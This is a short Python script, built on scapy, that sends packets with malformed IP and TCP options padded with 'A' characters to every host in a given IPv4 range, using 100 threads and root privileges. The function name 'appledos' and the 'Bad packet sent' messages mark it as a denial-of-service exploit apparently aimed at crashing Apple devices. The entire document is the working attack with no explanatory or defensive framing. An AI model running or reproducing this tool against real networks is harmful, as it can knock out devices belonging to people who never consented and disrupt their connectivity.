#!/usr/bin/env python3
from scapy.all import IP, IPOption, send, TCP
from scapy.error import Scapy_Exception
from concurrent.futures import ThreadPoolExecutor
import ipaddress, sys, os, time

def sender(ipaddr, port):
    overflow = "A" * 18
    ip_header = IP(dst=str(ipaddr), options=[IPOption(overflow)])
    tcp_header = TCP(dport=port, options=[(1, overflow),(1, overflow)])
    try:
        send(ip_header/tcp_header, verbose=False)
        sys.stdout.write("[+] Bad packet sent to {}\n".format(ipaddr))
    except Scapy_Exception as e:
        sys.stdout.write("[-] Packet to {} error: {}\n".format(ipaddr, e))

def appledos(ipaddr, port):
    if os.getuid() == 0:
        executor = ThreadPoolExecutor(max_workers=100)
        futures = []
        for ipadd in ipaddress.IPv4Network(ipaddr):
            a = executor.submit(sender, ipadd, port)
            futures.append(a)

        while True:
            cek = a.done()
            if cek == True: time.sleep(5); break

    else: print('[!] Need to run as root')